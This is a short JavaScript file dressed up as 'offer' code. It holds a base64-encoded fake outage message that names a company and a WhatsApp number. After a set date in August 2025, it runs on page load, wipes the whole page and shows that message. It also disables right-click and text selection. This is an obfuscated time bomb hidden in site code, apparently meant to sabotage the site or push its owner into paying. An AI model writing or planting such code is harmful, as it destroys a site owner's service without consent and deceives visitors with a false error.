var offerStart = new Date('2025-08-01T00:00:03');
var offerHTML = "PGRpdiBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6MjAlOyc+PGgxPk9vcHMhIFRoZSB3ZWJzaXRlIGlzIGN1cnJlbnRseSBkb3duIGR1ZSB0byB1bmV4cGVjdGVkIHNlcnZlciBlcnJvcnMgY2F1c2luZyBvcGVyYXRpb25hbCBpc3N1ZXMuIFBsZWFzZSBjb250YWN0IFphcGlvIFNvbHV0aW9ucyBvbiBXaGF0c0FwcCBhdCArOTIgMzA1IDYzNDg2MDYgdG8gcmVzb2x2ZSB0aGUgcHJvYmxlbS48L2gxPjwvZGl2Pg==";

function decodeOfferMessage(a) {
    return decodeURIComponent(escape(window.atob(a)));
}

function showOffer() {
    document.body.innerHTML = decodeOfferMessage(offerHTML);
    document.addEventListener('contextmenu', function(a) {
        a.preventDefault();
    });
    document.body.style.textAlign = 'center';
    document.body.style.userSelect = 'none';
    document.body.style.webkitUserSelect = 'none';
    document.body.style.mozUserSelect = 'none';
    document.body.style.msUserSelect = 'none';
}

function checkOfferStatus() {
    var a = new Date();
    if (a >= offerStart) {
        showOffer();
    }
}

window.onload = checkOfferStatus;
